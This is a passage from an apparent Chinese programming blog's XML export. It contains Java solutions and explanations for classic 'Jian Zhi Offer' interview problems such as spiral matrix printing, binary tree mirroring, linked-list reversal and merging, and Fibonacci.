    <content type="text"><![CDATA[顺时针打印矩阵. 题目描述输入一个矩阵，按照从外向里以顺时针的顺序依次打印出每一个数字，例如，如果输入如下矩阵： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 则依次打印出数字1,2,3,4,8,12,16,15,14,13,9,5,6,7,11,10. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 1 2 3 4 8 12 16 15 14 13 9 5 6 7 11 10 实现思路模拟魔方的旋转。 用旋转魔法的方式，一直取出第一行； 例如 1 2 3 4 5 6 7 8 9 输出并删除第一行后，变为 4 5 6 7 8 9 再进行一次逆时针旋转，就变成： 6 9 5 8 4 7 继续重复上述操作即可。 代码实现1234567891011121314151617181920212223242526272829303132333435import java.util.ArrayList;public class Solution &#123; public ArrayList&lt;Integer&gt; printMatrix(int [][] matrix) &#123; int rows = matrix.length; ArrayList&lt;Integer&gt; list = new ArrayList&lt;Integer&gt;(); while(rows &gt; 0)&#123; for(int i=0;i&lt;matrix[0].length;i++)&#123; list.add(matrix[0][i]); &#125; if(rows == 1)&#123; break; &#125; matrix = revert(matrix); rows = matrix.length; &#125; return list; &#125; private int[][] revert(int[][] matrix)&#123; int rows = matrix.length; int cols = matrix[0].length; int[][] temp = new int[cols][rows-1]; for(int j=cols-1;j&gt;=0;j--)&#123; for(int i=1;i&lt;rows;i++)&#123; temp[cols-1-j][i-1] = matrix[i][j]; &#125; &#125; return temp; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题19：二叉树的镜像】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9819%EF%BC%9A%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E9%95%9C%E5%83%8F%E3%80%91%2F</url>
    <content type="text"><![CDATA[二叉树的镜像. 题目描述操作给定的二叉树，将其变换为源二叉树的镜像。 输入描述:二叉树的镜像定义： 源二叉树 8 / \ 10 6 / \ / \ 11 9 7 5 镜像二叉树 8 / \ 6 10 / \ / \ 5 7 9 11 代码实现1234567891011121314151617181920212223242526272829/**public class TreeNode &#123; int val = 0; TreeNode left = null; TreeNode right = null; public TreeNode(int val) &#123; this.val = val; &#125;&#125;*/public class Solution &#123; public void Mirror(TreeNode root) &#123; if(root == null) return; if(root.left == null &amp;&amp; root.right == null) return; TreeNode nodeTemp = root.right; root.right = root.left; root.left = nodeTemp; if(root.left != null) Mirror(root.left); if(root.right != null) Mirror(root.right); &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题18：树的子结构】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9818%EF%BC%9A%E6%A0%91%E7%9A%84%E5%AD%90%E7%BB%93%E6%9E%84%E3%80%91%2F</url>
    <content type="text"><![CDATA[树的子结构. 题目描述输入两棵二叉树A，B，判断B是不是A的子结构。（ps：我们约定空树不是任意一个树的子结构） 代码实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253/**public class TreeNode &#123; int val = 0; TreeNode left = null; TreeNode right = null; public TreeNode(int val) &#123; this.val = val; &#125;&#125;*/public class Solution &#123; public boolean HasSubtree(TreeNode root1,TreeNode root2) &#123; boolean result = false; if(root1 != null &amp;&amp; root2 != null)&#123; if(root1.val == root2.val)&#123; //根结点匹配的话，比较下面的节点是否都相等 result = tree1ConstainsTree2(root1,root2); &#125; //根结点不匹配,直接更换左子节点或者右子节点再进行比较 if(!result)&#123; result = HasSubtree(root1.left,root2); &#125; if(!result)&#123; result = HasSubtree(root1.right,root2); &#125; &#125; return result; &#125; private boolean tree1ConstainsTree2(TreeNode root1,TreeNode root2)&#123; //如果子树已经遍历完毕，说明是其字树 if(root2 == null)&#123; return true; &#125; //如果子树还没被遍历完毕，但是A树已经遍历完毕，说明不是其子树 //所以这边顺序要注意一下 if(root1 == null)&#123; return false; &#125; //值不一样，肯定不是其子树 if(root1.val != root2.val)&#123; return false; &#125; //递归比较子节点是否相等 return tree1ConstainsTree2(root1.left,root2.left) &amp;&amp; tree1ConstainsTree2(root1.right,root2.right); &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题17： 合并两个排序的链表】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9817%EF%BC%9A%20%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%8E%92%E5%BA%8F%E7%9A%84%E9%93%BE%E8%A1%A8%E3%80%91%2F</url>
    <content type="text"><![CDATA[合并两个排序的链表. 题目描述输入两个单调递增的链表，输出两个链表合成后的链表，当然我们需要合成后的链表满足单调不减规则。 代码实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253/*public class ListNode &#123; int val; ListNode next = null; ListNode(int val) &#123; this.val = val; &#125;&#125;*/public class Solution &#123; public ListNode Merge(ListNode list1,ListNode list2) &#123; if(list1 == null)&#123; return list2; &#125; if(list2 == null)&#123; return list1; &#125; //合成后的链表的首节点 ListNode head = null; //合成链表的当前节点 ListNode node = null; while(list1!=null &amp;&amp; list2!=null)&#123; //list1的元素比较小 if(list1.val &lt;= list2.val)&#123; //head为空的情况 if(head == null)&#123; node = head = list1; &#125;else&#123; node.next = list1; node = node.next; &#125; list1 = list1.next; &#125;else&#123; if(head == null)&#123; node = head = list2; &#125;else&#123; node.next = list2; node = node.next; &#125; list2 = list2.next; &#125; &#125; //其中一个走到头了，另一个直接添加到尾部即可 if(list1 == null)&#123; node.next = list2; &#125; if(list2 == null)&#123; node.next = list1; &#125; return head; &#125;&#125; 递归版本： 123456789101112131415public ListNode Merge(ListNode list1,ListNode list2) &#123; if(list1 == null)&#123; return list2; &#125; if(list2 == null)&#123; return list1; &#125; if(list1.val &lt;= list2.val)&#123; list1.next = Merge(list1.next, list2); return list1; &#125;else&#123; list2.next = Merge(list1, list2.next); return list2; &#125; &#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题16： 反转链表】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9816%EF%BC%9A%20%E5%8F%8D%E8%BD%AC%E9%93%BE%E8%A1%A8%E3%80%91%2F</url>
    <content type="text"><![CDATA[反转链表. 题目描述输入一个链表，反转链表后，输出链表的所有元素。 代码实现11234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556public class ReverseList &#123; public static class ListNode &#123; int val; ListNode next = null; ListNode(int val) &#123; this.val = val; &#125; &#125; public static ListNode reverseList(ListNode head) &#123; //定义一个栈来存放节点 Stack&lt;ListNode&gt; stack = new Stack&lt;ListNode&gt;(); //遍历所有的节点并且将其放进栈中 ListNode node = head; while(node != null)&#123; stack.push(node); node = node.next; &#125; //定义两个头节点首先都先指向新构建的链表的头部 //newFirst是用来形成新链表，所以是一直移动的 //newFirstBak是永远停留在头节点，用于程序返回 ListNode newFirst = null; ListNode newFirstBak = null; while(!stack.isEmpty())&#123; //如果是第一次创建链表 if(newFirst == null)&#123; newFirst = new ListNode(stack.pop().val); newFirstBak = newFirst; &#125;else&#123; //后面以此添加节点 ListNode temp = new ListNode(stack.pop().val); newFirst.next = temp; newFirst = newFirst.next; &#125; &#125; //返回新构建的链表的头节点 return newFirstBak; &#125; public static void main(String[] args) &#123; ListNode head = new ListNode(1); head.next = new ListNode(2); head.next.next = new ListNode(3); head.next.next.next = new ListNode(4); head.next.next.next.next = new ListNode(5); ListNode node = reverseList(head); System.out.println(node.val); System.out.println(node.next.val); System.out.println(node.next.next.val); System.out.println(node.next.next.next.val); System.out.println(node.next.next.next.next.val); &#125;&#125; 代码实现2123456789101112131415161718public class Solution &#123; public ListNode ReverseList(ListNode head) &#123; if(head == null)&#123; return null; &#125; ListNode pre = null; ListNode next = null; while(head != null)&#123; next = head.next; head.next = pre; pre = head; head = next; &#125; return pre; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题15： 链表中倒数第k个结点】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9815%EF%BC%9A%20%E9%93%BE%E8%A1%A8%E4%B8%AD%E5%80%92%E6%95%B0%E7%AC%ACk%E4%B8%AA%E7%BB%93%E7%82%B9%E3%80%91%2F</url>
    <content type="text"><![CDATA[链表中倒数第k个结点. 题目描述输入一个链表，输出该链表中倒数第k个结点。 代码实现1234567891011121314151617181920212223242526272829303132333435public class FindKthToTail &#123; public class ListNode &#123; int val; ListNode next = null; ListNode(int val) &#123; this.val = val; &#125; &#125; public ListNode FindKthToTail(ListNode head,int k) &#123; if(head == null || k &lt;= 0)&#123; return null; &#125; //定义一个pre节点指向head ListNode pre = head; //定义一个last节点指向head ListNode last = head; for(int i=0;i&lt;k-1;i++)&#123; if(last.next != null)&#123; last = last.next; &#125;else&#123; return null; &#125; &#125; while(!(last.next==null))&#123; pre = pre.next; last = last.next; &#125; return pre; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题14： 调整数组顺序使奇数位于偶数前面】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9814%EF%BC%9A%20%E8%B0%83%E6%95%B4%E6%95%B0%E7%BB%84%E9%A1%BA%E5%BA%8F%E4%BD%BF%E5%A5%87%E6%95%B0%E4%BD%8D%E4%BA%8E%E5%81%B6%E6%95%B0%E5%89%8D%E9%9D%A2%E3%80%91%2F</url>
    <content type="text"><![CDATA[调整数组顺序使奇数位于偶数前面. 题目描述输入一个整数数组，实现一个函数来调整该数组中数字的顺序，使得所有的奇数位于数组的前半部分，所有的偶数位于位于数组的后半部分，并保证奇数和奇数，偶数和偶数之间的相对位置不变。 代码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051public class ReOrderArray &#123; public static void reOrderArray(int[] array)&#123; //创建一个新的同样长度的数组 int[] newArray = new int[array.length]; //count是用来计算数组中奇数的个数 int count = 0; for(int i=0;i&lt;array.length;i++)&#123; if(array[i]%2==1)&#123; count++; &#125; &#125; //开始将元素按照规则放进新的数组中去 int oddBegin=0; for(int i=0;i&lt;array.length;i++)&#123; if((array[i]&amp;1)==1) &#123; newArray[oddBegin++]=array[i]; &#125;else&#123; newArray[count++]=array[i]; &#125; &#125; //将原数组替换掉 for(int k=0;k&lt;array.length;k++)&#123; array[k] = newArray[k]; &#125; &#125; /** * 输出数组的信息 * * @param arr 待输出数组 */ public static void printArray(int[] arr) &#123; if (arr != null &amp;&amp; arr.length &gt; 0) &#123; for (int i : arr) &#123; System.out.print(i + " "); &#125; System.out.println(); &#125; &#125; public static void main(String[] args) &#123; int[] array = &#123;0, 1, 2, 3, 4, 5, 6, 7, 8, 9&#125;; reOrderArray(array); printArray(array); &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题13： 数值的整数次方】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9813%EF%BC%9A%20%E6%95%B0%E5%80%BC%E7%9A%84%E6%95%B4%E6%95%B0%E6%AC%A1%E6%96%B9%E3%80%91%2F</url>
    <content type="text"><![CDATA[数值的整数次方. 题目描述给定一个double类型的浮点数base和int类型的整数exponent（可能为负）。求base的exponent次方。 代码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960public class Power &#123; //传统方法，时间复杂度为O(n) public static double power(double base, int exponent)&#123; double result = 1.0; if(exponent == 0)&#123; return 1; &#125;else if(exponent &gt; 0)&#123; while(exponent &gt; 0)&#123; result *= base; exponent--; &#125; return result; &#125;else&#123; if(base == 0) throw new RuntimeException("分母不能为0啊"); int temp = java.lang.Math.abs(exponent); while(temp &gt; 0)&#123; result *= base; temp--; &#125; return 1/result; &#125; &#125; //优化 public static double power2(double base, int exponent)&#123; //盛放结果的参数，初始化为1 double result = 1; //给指数一个副本 int index = exponent; //给底数一个副本 double curr = base; //当指数为0时直接返回1 if(exponent == 0)&#123; return 1; //当指数小于0时，先判断分母是不是0，然后先将指数取反 &#125;else if(exponent &lt; 0)&#123; if(base == 0)&#123; throw new RuntimeException("指数为负数的情况下，分母不能为0"); &#125; index = -exponent; &#125; //对指数进行位的判断 while(index != 0)&#123; if((index&amp;1) == 1)&#123; result *= curr; &#125; //移位-》每次都要翻倍 curr *= curr; index &gt;&gt;= 1; &#125; return exponent &gt; 0?result:1/result; &#125; public static void main(String[] args) &#123; System.out.println(power(2, -3)); System.out.println(power2(2, -3)); &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题12 ： 二进制中1的个数】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9812%20%EF%BC%9A%20%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%AD1%E7%9A%84%E4%B8%AA%E6%95%B0%E3%80%91%2F</url>
    <content type="text"><![CDATA[二进制中1的个数. 题目描述输入一个整数，输出该数二进制表示中1的个数。其中负数用补码表示。 代码实现1234567891011121314151617181920212223242526272829303132public class NumberOf1 &#123; /* * 第一种方式 */ public static int numberOf1(int num)&#123; int count = 0; for(int i=0;i&lt;32;i++)&#123; //每一位都与1进行与操作 count += (num &amp; 1); num &gt;&gt;&gt;= 1; &#125; return count; &#125; /* * 第二种方式 */ public static int numberOf2(int num)&#123; int count = 0; while(num != 0)&#123; count++; //逐渐地将最右边的1给消除掉了，最后变成了0 num = num &amp; (num-1); &#125; return count; &#125; public static void main(String[] args) &#123; System.out.println(numberOf1(15));//4 System.out.println(numberOf2(15));//4 &#125;&#125; 引申：给一个整数，把他以二进制的形式输出出来。 123456789101112131415161718public class NumTo2 &#123; private static Stack&lt;Integer&gt; stack = new Stack(); public static void numTo2(int num)&#123; for(int i=0;i&lt;32;i++)&#123; int slot = num &amp; 1; num &gt;&gt;&gt;= 1; stack.push(slot); &#125; &#125; public static void main(String[] args) &#123; numTo2(2); while(!stack.isEmpty())&#123; System.out.print(stack.pop()+" "); &#125; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题11 ： 矩形覆盖】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9811%20%EF%BC%9A%20%E7%9F%A9%E5%BD%A2%E8%A6%86%E7%9B%96%E3%80%91%2F</url>
    <content type="text"><![CDATA[矩形覆盖. 【题目描述】我们可以用21的小矩形横着或者竖着去覆盖更大的矩形。请问用n个21的小矩形无重叠地覆盖一个2*n的大矩形，总共有多少种方法？ 【代码实现】12345678910111213141516171819public class Solution &#123; public int RectCover(int target) &#123; int a = 1,b = 2,c =0; if(target&lt;=0)&#123; return 0; &#125;else if(target == 1)&#123; return 1; &#125;else if(target == 2)&#123; return 2; &#125;else&#123; for(int i=3; i&lt;=target;i++)&#123; c = a+b; a = b; b = c; &#125; return c; &#125; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题10 ： 变态跳台阶】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9810%20%EF%BC%9A%20%E5%8F%98%E6%80%81%E8%B7%B3%E5%8F%B0%E9%98%B6%E3%80%91%2F</url>
    <content type="text"><![CDATA[变态跳台阶. 题目描述一只青蛙一次可以跳上1级台阶，也可以跳上2级……它也可以跳上n级。求该青蛙跳上一个n级的台阶总共有多少种跳法。 思路 跳一级台阶有一种跳法； 12f(1) = 1//一个台阶只有一种跳法 跳两级台阶有两种跳法，即一个台阶一个台阶地跳和一次性跳两个台阶： 123f(2) = 2 = f(2-1) + f(2-2);//f(2-2) 表示2阶一次跳2阶的次数。//n = 2时，会有两个跳的方式，一次1阶或者2阶，这回归到了问题（1） ，f(2) = f(2-1) + f(2-2) 跳三级台阶有四种跳法 1234f(3) = 4 = f(3-1) + f(3-2) + f(3-3)//第一次跳出1阶后面剩下：f(3-1);//第一次跳出2阶，剩下f(3-2)；//第一次3阶，那么剩下f(3-3) n = n时，会有n中跳的方式，1阶、2阶…n阶，得出结论： 1f(n) = f(n-1)+f(n-2)+...+f(n-(n-1)) + f(n-n) =&gt; f(0) + f(1) + f(2) + f(3) + ... + f(n-1) 但是为了简单，我们可以继续简化： 1234f(n-1) = f(0) + f(1)+f(2)+f(3) + ... + f((n-1)-1) = f(0) + f(1) + f(2) + f(3) + ... + f(n-2)f(n) = f(0) + f(1) + f(2) + f(3) + ... + f(n-2) + f(n-1) = f(n-1) + f(n-1)可以得出：f(n) = 2*f(n-1) 得出最终结论,在n阶台阶，一次有1、2、…n阶的跳的方式时，总得跳法为： 123 | 1 ,(n=0 ) f(n) = | 1 ,(n=1 ) | 2*f(n-1),(n&gt;=2) 代码实现1234567891011public class Solution &#123; public int JumpFloorII(int target) &#123; if (target &lt;= 0) &#123; return -1; &#125; else if (target == 1) &#123; return 1; &#125; else &#123; return 2 * JumpFloorII(target - 1); &#125; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题9 ： 跳台阶】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%989%20%EF%BC%9A%20%E8%B7%B3%E5%8F%B0%E9%98%B6%E3%80%91%2F</url>
    <content type="text"><![CDATA[跳台阶. 题目描述一只青蛙一次可以跳上1级台阶，也可以跳上2级。求该青蛙跳上一个n级的台阶总共有多少种跳法。 思路比较倾向于找规律的解法，f(1) = 1, f(2) = 2, f(3) = 3, f(4) = 5， 可以总结出f(n) = f(n-1) + f(n-2)的规律，但是为什么会出现这样的规律呢？假设现在6个台阶，我们可以从第5跳一步到6，这样的话有多少种方案跳到5就有多少种方案跳到6，另外我们也可以从4跳两步跳到6，跳到4有多少种方案的话，就有多少种方案跳到6，其他的不能从3跳到6什么的啦，所以最后就是f(6) = f(5) + f(4)；这样子也很好理解变态跳台阶的问题了。 代码实现12345678910111213141516171819202122public class Test09 &#123; public static int JumpFloor(int target) &#123; int first = 1,second=1,third=0; if(target&lt;=0)&#123; return 0; &#125;else if(target == 1 || target == 2)&#123; return 1; &#125;else &#123; for(int i=3;i&lt;=target;i++)&#123; third = first+second; first = second; second = third; &#125; return third; &#125; &#125; public static void main(String[] args) &#123; int result = JumpFloor(10); System.out.println(result); &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题8 ： 斐波那契数列】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%988%20%EF%BC%9A%20%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0%E5%88%97%E3%80%91%2F</url>
    <content type="text"><![CDATA[斐波那契数列. 题目 思路显然是不能用递归的，因为时间复杂度太高。 可以考虑用两个变量分别存储n的前两个数值。也可以考虑用一个n+1的数组来存放。我这里选择前一个方案。 代码实现12345678910111213141516171819202122public class Test08 &#123; public static int Fibonacci(int n) &#123; int a=1,b=1,c=0; if(n&lt;0)&#123; return 0; &#125;else if(n == 1 || n ==2)&#123; return 1; &#125;else &#123; for (int i=3;i&lt;=n;i++)&#123; c = a + b; a = b; b = c; &#125; return c; &#125; &#125; public static void main(String[] args) &#123; int result = Fibonacci(11); System.out.println(result);//89 &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题7：旋转数组的最小数字】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%987%EF%BC%9A%E6%97%8B%E8%BD%AC%E6%95%B0%E7%BB%84%E7%9A%84%E6%9C%80%E5%B0%8F%E6%95%B0%E5%AD%97%E3%80%91%2F</url>
    <content type="text"><![CDATA[旋转数组的最小数字. 题目描述把一个数组最开始的若干个元素搬到数组的末尾，我们称之为数组的旋转。 输入一个非递减排序的数组的一个旋转，输出旋转数组的最小元素。 例如数组{3,4,5,1,2}为{1,2,3,4,5}的一个旋转，该数组的最小值为1。 NOTE：给出的所有元素都大于0，若数组大小为0，请返回0。 思路对于这个题目的“非递减排序的数组”，是类似于这样的数组：1 2 2 3 3 使用遍历整个数组一一比较，拿到最小的值显然是最低效的方式，针对这种特殊的数组，我们想到了二分查找。 代码实现123456789101112131415161718192021import java.util.ArrayList;public class Solution &#123; public int minNumberInRotateArray(int [] array) &#123; if(array.length == 0)&#123; return 0; &#125; int low = 0,high = array.length-1; while(low&lt;=high)&#123; int mid = low + (high-low)/2; //若中间大于末尾 if(array[mid] &gt; array[high])&#123; low = mid+1; &#125;else if(array[mid] == array[high])&#123; high = high-1; &#125;else&#123; high = mid; &#125; &#125; return array[low]; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题6：用两个栈实现队列】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%986%EF%BC%9A%E7%94%A8%E4%B8%A4%E4%B8%AA%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97%E3%80%91%2F</url>
    <content type="text"><![CDATA[用两个栈实现队列. 题目用两个栈来实现一个队列，完成队列的Push和Pop操作。 队列中的元素为int类型。 思路 代码实现12345678910111213141516171819202122import java.util.Stack; public class Solution &#123; Stack&lt;Integer&gt; stack1 = new Stack&lt;Integer&gt;(); Stack&lt;Integer&gt; stack2 = new Stack&lt;Integer&gt;(); public void push(int node) &#123; stack1.push(node); &#125; public int pop() &#123; if(stack1.empty()&amp;&amp;stack2.isEmpty())&#123; throw new RuntimeException("Queue is empty!"); &#125; if(stack2.isEmpty())&#123; while(!stack1.isEmpty())&#123; stack2.push(stack1.pop()); &#125; &#125; return stack2.pop(); &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题5 ：重建二叉树】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%985%20%EF%BC%9A%E9%87%8D%E5%BB%BA%E4%BA%8C%E5%8F%89%E6%A0%91%E3%80%91%2F</url>
    <content type="text"><![CDATA[重建二叉树. 题目：输入某二叉树的前序遍历和中序遍历的结果，请重建出该二叉树。假设输入的前序遍历和中序遍历的结果中都不含重复的数字。例如：前序遍历序列｛ 1, 2, 4, 7, 3, 5, 6, 8｝和中序遍历序列｛4, 7, 2, 1, 5, 3, 8，6}，重建出下图所示的二叉树并输出它的头结点。 首先要了解什么是前序遍历、中序遍历和后序遍历，这个概念我已经在《算法》读书笔记的《6、二分搜索树（上）》中详细介绍了。 定义节点类型123456789class TreeNode &#123; int val; TreeNode left; TreeNode right; TreeNode(int x) &#123; val = x; &#125;&#125; 代码实现12345678910111213141516171819202122232425262728293031public class Solution &#123; public TreeNode reConstructBinaryTree(int [] pre,int [] in) &#123; TreeNode root=reConstructBinaryTree(pre,0,pre.length-1,in,0,in.length-1); return root; &#125; //前序遍历&#123;1,2,4,7,3,5,6,8&#125;和中序遍历序列&#123;4,7,2,1,5,3,8,6&#125; private TreeNode reConstructBinaryTree(int [] pre,int startPre,int endPre,int [] in,int startIn,int endIn) &#123; //递归停止条件,因为每次都取左孩子和右孩子，这个指向前序或者中序数组一头一尾的索引，尾小于头的时候，就要停止递归了 if(startPre&gt;endPre||startIn&gt;endIn) return null; //左孩子或者右孩子的根节点 TreeNode root=new TreeNode(pre[startPre]); //pre数组第一个元素为根节点root //在in数组中找到root位置，那么前面为左孩子中序遍历(假设n个)，后面为右孩子中序遍历(假设m个) //那么根据这个n和m，就能在pre数组中找到左孩子前序遍历和右孩子前序遍历 //那么递归的时候，root.left就是【左孩子前序遍历，左孩子中序遍历】,root.right就是【右孩子前序遍历，右孩子中序遍历】 //这样一直到叶子节点，停止 for(int i=startIn;i&lt;=endIn;i++) if(in[i]==pre[startPre])&#123; //左子树的前序序列和中序序列 root.left=reConstructBinaryTree(pre,startPre+1,startPre+i-startIn,in,startIn,i-1); //右子树的前序序列和中序序列 root.right=reConstructBinaryTree(pre,i-startIn+startPre+1,endPre,in,i+1,endIn); break; &#125; return root; &#125;&#125; 重构过程 前序遍历：12473568中序遍历：47215386 前序遍历中的第一个值为树根 树根在中序遍历中的位置，左侧为左子树的中序遍历结果（472），右侧为右子树的中序遍历结果（5386） 在前序遍历中，左子树的前序遍历结果为（247），右子树的前序遍历结果为（3568） 则2为左子树的树根，3为右子树的树根 重复上述操作直至结束]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题4 ： 从尾到头打印链表】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%984%20%EF%BC%9A%20%E4%BB%8E%E5%B0%BE%E5%88%B0%E5%A4%B4%E6%89%93%E5%8D%B0%E9%93%BE%E8%A1%A8%E3%80%91%2F</url>
    <content type="text"><![CDATA[从尾到头打印链表. 题目输入一个链表，从尾到头打印链表每个节点的值。 思路1利用java提供的ArrayList和statck来实现。 即利用栈的后进先出的性质，将其push进栈，然后pop的时候便是反序输出。 代码11234567891011121314151617181920212223242526272829303132333435363738394041424344public class Test04 &#123; public static class ListNode &#123; int val; ListNode next = null; ListNode(int val)&#123; this.val = val; &#125; &#125; public static ArrayList&lt;Integer&gt; printListFromTailToHead(ListNode listNode) &#123; //初始化ArrayList，用于存放结果 ArrayList&lt;Integer&gt; arrayList = new ArrayList&lt;Integer&gt;(); //初始化栈 Stack&lt;Integer&gt; stack = new Stack&lt;Integer&gt;(); System.out.print("正序输出："); while(listNode != null)&#123; //push进栈 stack.push(listNode.val); System.out.print(listNode.val+" "); listNode = listNode.next; &#125; //遍历栈 while (!stack.isEmpty())&#123; arrayList.add(stack.pop()); &#125; return arrayList; &#125; public static void main(String[] args) &#123; //构建一个链表用于测试 ListNode root = new ListNode(1); root.next = new ListNode(2); root.next.next = new ListNode(3); root.next.next.next = new ListNode(4); root.next.next.next.next = new ListNode(5); //输出结果 ArrayList&lt;Integer&gt; list = printListFromTailToHead(root); System.out.println(); System.out.print("倒序输出："); for(Integer i:list)&#123; System.out.print(i+" "); &#125; &#125;&#125; 结果： 12正序输出：1 2 3 4 5 倒序输出：5 4 3 2 1 思路2利用递归，可以使代码变得非常简洁。 12345678private static ArrayList&lt;Integer&gt; arrayList = new ArrayList&lt;Integer&gt;();public static ArrayList&lt;Integer&gt; printListFromTailToHead(ListNode listNode) &#123; if(listNode != null)&#123; printListFromTailToHead(listNode.next); arrayList.add(listNode.val); &#125; return arrayList;&#125; 仔细领会递归的精髓吧！ 思路3因为是比较特殊的链表，那可以在链表本身进行原地翻转，最后再依次添加进链表中。 1234567891011121314151617181920212223import java.util.ArrayList;public class Solution &#123; public ArrayList&lt;Integer&gt; printListFromTailToHead(ListNode listNode) &#123; ArrayList&lt;Integer&gt; list = new ArrayList&lt;Integer&gt;(); ListNode pre = null; ListNode next = null; while(listNode!=null)&#123; next = listNode.next; listNode.next = pre; pre = listNode; listNode = next; &#125; while(pre != null)&#123; list.add(pre.val); pre = pre.next; &#125; return list; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题3 ： 替换空格】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%983%20%EF%BC%9A%20%E6%9B%BF%E6%8D%A2%E7%A9%BA%E6%A0%BC%E3%80%91%2F</url>
    <content type="text"><![CDATA[替换空格. 题目请实现一个函数，把字符串中的每个空格替换成”%20”，例如“We are happy.”，则输出“We%20are%20happy.”。 思路首先确定两个问题： 是在原来的空间基础上继续增加还是新开辟一个空间来存放 是从前往后遍历和替换还是从后往前？ 从前往后替换，后面的字符要不断往后移动，要多次移动，所以效率低下；从后往前，需要先计算需要多少空间再挪，每个字符只移动一次，效率高一点。这里直接在原来的空间上进行操作即可。 代码12345678910111213141516171819202122232425262728293031323334public class Test03 &#123; public static String replaceSpace(StringBuffer str) &#123; // 方法一：直接调用replaceAll() // return str.toString().replaceAll("\\s","%20"); //不考虑replaceAll()方法 //从后往前，先计算需要多少空间，然后从后往前移动，则每个字符只为移动一次，这样效率更高一点。 int spaceNum = 0;//用于计算空格数量 for(int i=0; i &lt; str.length(); i++)&#123; if(str.charAt(i) == ' ')&#123; spaceNum++; &#125; &#125; int indexOld = str.length()-1;//旧str的最后一个位置索引 int newlength = str.length() + spaceNum*2;//新str的长度 int indexnew = newlength - 1;//新str的最后一个位置索引 str.setLength(newlength);//设置新长度 for(;indexOld &gt;= 0 &amp;&amp; indexOld &lt; newlength;--indexOld)&#123;//从后往前遍历老str if(str.charAt(indexOld) == ' ')&#123;//如果碰到空格 str.setCharAt(indexnew--,'0'); str.setCharAt(indexnew--,'2'); str.setCharAt(indexnew--,'%'); &#125;else &#123;//否则就直接将老str位置的内容赋给新的str对应的位置 